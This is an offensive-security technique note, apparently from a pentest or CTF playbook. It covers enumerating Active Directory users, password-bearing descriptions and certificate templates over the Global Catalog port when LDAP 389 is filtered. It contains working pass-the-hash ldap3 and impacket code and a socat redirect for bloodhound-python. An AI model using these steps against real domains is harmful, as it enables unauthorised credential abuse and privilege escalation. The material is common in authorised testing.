# LDAP Enum via Global Catalog (3268) when Port 389 is Filtered

## When this applies

- DC's port 389 (LDAP) and 636 (LDAPS) are filtered by Windows Firewall.
- Port 3268 (GC) and/or 3269 (GC SSL) are open.
- Many tools (certipy, bloodhound-python, impacket GetADUsers) hardcode 389 and time out.
- Goal: still enumerate users, groups, and certificate templates without 389.

## Technique

Global Catalog (port 3268) is a partial replica of the forest. It holds *enough* attributes to enumerate users, groups, descriptions, memberships, and most certificate-template fields — except for `msPKI-*` attributes (which are not GC-replicated by default, they're `Domain` scope).

Authentication on GC accepts NTLM PtH the same as 389 — but ldap3 needs the `LM:NT` format (`aad3b435b51404eeaad3b435b51404ee:<nthash>`) when using `authentication=NTLM`, not the `:nthash` impacket convention.

## Steps

### Direct enum with ldap3

```python
import ldap3
server = ldap3.Server(DC_IP, port=3268, use_ssl=False, get_info=ldap3.ALL)
conn = ldap3.Connection(
    server,
    user='DOMAIN\\user',
    password='aad3b435b51404eeaad3b435b51404ee:<nthash>',  # LM:NT — the LM is the empty-LM constant
    authentication=ldap3.NTLM,
)
conn.bind()  # → True

# Enumerate users with descriptions (often hide passwords)
conn.search('DC=domain,DC=local', '(&(objectClass=user)(description=*))',
            attributes=['sAMAccountName', 'description'])
for e in conn.entries: print(e.sAMAccountName, '-', e.description)

# Enumerate cert templates
conn.search('CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local',
            '(objectClass=pKICertificateTemplate)',
            attributes=['cn','displayName','pKIExtendedKeyUsage','nTSecurityDescriptor'])

# Enumerate CAs
conn.search('CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local',
            '(objectClass=pKIEnrollmentService)',
            attributes=['cn', 'dNSHostName', 'certificateTemplates'])
```

### Impacket scripts via `gc://` URL

`impacket.ldap.LDAPConnection` accepts `gc://<host>` to use port 3268 with NTLM:

```python
from impacket.ldap import ldap
ldap_c = ldap.LDAPConnection('gc://DC.domain.local', baseDN='DC=domain,DC=local', dstIp=DC_IP)
ldap_c.kerberosLogin(username, '', domain, '', '', kdcHost=DC_IP, useCache=True)
# Now run searches normally
```

### certipy + bloodhound-python on 3268

These tools don't accept a port flag for 389. Workarounds:

- **certipy `find -scheme ldap` only allows {ldap, ldaps}** — no GC. Workaround: write your own ldap3-based enumeration (above) for cert template data, then use `certipy req` separately (it talks RPC, not LDAP, so 389 isn't needed for the request itself).
- **bloodhound-python** accepts `--use-ldaps` to talk 636 (filtered) but no GC port. Patch the source or run a `socat 389 → 3268` redirect on the attacker:
  ```bash
  # macOS/Linux: nonroot can bind 389 (depends on platform — Linux needs sudo)
  socat TCP-LISTEN:389,fork,reuseaddr TCP:DC_IP:3268 &
  bloodhound-python -d domain -u user --hashes ':<NT>' -dc 127.0.0.1 ...
  ```

## Verifying success

- `conn.bind()` returns `True` and `conn.result['result']==0`.
- `conn.search(...)` returns ldap3 entries you can iterate.
- Wrong password (data 52e) and "machine account cannot interactive" (data 710) errors look the same — read the `data` code carefully.

## Common pitfalls

- **`msPKI-Certificate-Name-Flag` and `msPKI-Enrollment-Flag` are NOT GC-replicated by default** — you'll get empty values. Either query 389 directly (when reachable) or use `certipy req` to test enrollment empirically; the result tells you whether ENROLLEE_SUPPLIES_SUBJECT was set. If GC says `"flags": [131649]`, that's the regular `flags` attr (CT flags) which IS replicated, but it doesn't include the Name-Flag bits.
- **NTLM PtH password format mismatch** — ldap3 wants `aad3b435b51404eeaad3b435b51404ee:<nthash>`, NOT `:<nthash>` (impacket-style) and NOT `<nthash>` alone. data=52e from the bind tells you the format is wrong.
- **3268 SSL is 3269** — for SSL/TLS LDAP on the GC port, use `port=3269, use_ssl=True`. Same auth format.

## Tools

- ldap3 (`pip install ldap3`)
- impacket (LDAPConnection.gc:// URL)
- socat (for redirect when tool doesn't accept GC)
